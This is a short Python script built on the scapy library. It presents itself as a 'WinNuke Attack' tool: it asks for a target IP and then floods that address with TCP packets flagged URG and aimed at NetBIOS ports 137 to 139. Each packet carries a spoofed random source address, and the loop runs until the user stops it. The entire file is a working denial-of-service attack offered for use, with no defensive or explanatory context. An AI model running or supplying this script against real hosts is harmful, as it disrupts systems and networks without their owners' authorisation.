import scapy.all as scapy
import os


def WinNuke():

	clear = os.system('clear')

	print("**************************************")
	print("            WinNuke Attack")
	print("**************************************")
	print("Please input your target's IP")
	target = input("[WinNuke Attack]#")
	num = 0
	try:
		while True:
			packetss = scapy.IP(src=scapy.RandIP(),dst=target)/scapy.TCP(sport=scapy.RandShort(),dport=[139,138,137],flags=0x020,seq=1,window=512)
			scapy.send(packetss,verbose=False)
			num += 1
			print("Sent "+str(num)+"packets")
	except KeyboardInterrupt:
		print("[-] Ctrl + C detected.......")
	
WinNuke()